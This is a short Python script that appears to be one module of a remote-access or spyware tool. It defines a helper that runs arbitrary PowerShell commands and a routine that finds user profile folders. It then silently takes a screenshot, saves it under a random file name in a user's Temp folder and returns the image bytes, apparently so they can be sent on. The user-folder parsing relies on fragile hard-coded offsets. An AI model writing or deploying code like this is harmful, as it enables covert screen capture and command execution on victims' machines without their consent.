import pyscreeze
import os
import subprocess
import random


def random_name():
    abc = "qwertyuiopasdfghjklzxcvbnm1234567890"
    return "".join([abc[random.randint(0, len(abc) - 1)] for _ in range(0, len(abc) - 20)])


def exec_command(command):
    result = subprocess.run(["powershell.exe", command], shell=True, capture_output=True)
    if result.stderr.decode('cp866') == '':
        return result.stdout.decode('cp866')
    return result.stderr.decode('cp866')


def know_user():
    users = []
    pos1 = 315
    output = exec_command("dir C:\\Users")
    while len(output.strip()[pos1:].strip()) > 0:
        users.append(output.strip()[pos1:pos1-100+((pos1+120)-pos1)].strip())
        pos1 += 120
    return [i for i in users if i != 'Public']


def save_screenshot():
    for user_folder in know_user():
        path = f"C:\\Users\\{user_folder}\\Appdata\\Local\\Temp"
        if os.path.exists(path):
            file_name = random_name() + '.png'
            scr = pyscreeze.screenshot()
            scr.save(f"{path}\\{file_name}")
            print("successfully saved screenshot as " + file_name)
            return byte_represent(f"{path}\\{file_name}")
        print("continuing ...")
        continue


def byte_represent(path):
    with open(path, 'rb') as img_file:
        img_data = img_file.read()
        return img_data
